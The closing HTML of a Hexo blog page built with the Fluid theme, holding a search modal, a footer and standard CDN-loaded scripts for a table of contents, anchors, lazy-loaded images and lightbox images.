    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/blog/js/events.js" ></script>
<script  src="/blog/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/blog/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/blog/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/blog/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
